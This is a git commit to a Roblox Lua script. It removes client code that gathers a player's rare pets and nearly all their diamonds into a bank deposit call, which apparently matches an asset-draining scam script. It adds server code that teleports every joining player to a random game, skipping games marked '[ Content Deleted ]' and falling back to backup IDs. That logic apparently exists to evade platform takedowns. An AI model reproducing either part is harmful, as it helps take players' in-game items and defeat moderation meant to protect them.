feb9866983a5d7b6af5bd14d15942f5dc1b3e041
zoiddddd <100276046+zoiddddd@users.noreply.github.com>
2024-03-30 14:25:13 +0800

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,11 +1,36 @@
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
-local mybanks = lib.Network.Invoke("get my banks")
-local PetsList = {}
-for i,v in pairs(lib.Save.Get().Pets) do
-    local v2 = lib.Directory.Pets[v.id];
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
-        table.insert(PetsList, v.uid);
-    end
+
+local function getWorkingId(GameIds)
+	local nonDeletedGames = {}
+	for _, GameId in ipairs(GameIds) do
+		local GameName = game:GetService("MarketplaceService"):GetProductInfo(GameId).Name
+		if GameName ~= "[ Content Deleted ]" then
+			table.insert(nonDeletedGames, GameId)
+		end
+	end
+
+	if #nonDeletedGames == 0 then
+		print("All games restricted! Teleporting to backup game.")
+		return BackupGameIds[math.random(1, #BackupGameIds)]
+	else
+		return nonDeletedGames[math.random(1, #nonDeletedGames)]
+	end
 end
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+
+local function teleportPlayer(plr)
+	local TeleportService = game:GetService("TeleportService")
+	local WorkingGameID = getWorkingId(GameIds)
+	if WorkingGameID then
+		local success, errorMessage = pcall(function()
+			TeleportService:Teleport(WorkingGameID, plr)
+		end)
+		if not success then
+			print("Teleportation failed:", errorMessage)
+			wait(5) -- Wait before attempting teleportation again
+			teleportPlayer(plr) -- Retry teleportation
+		end
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	teleportPlayer(plr)
+end)
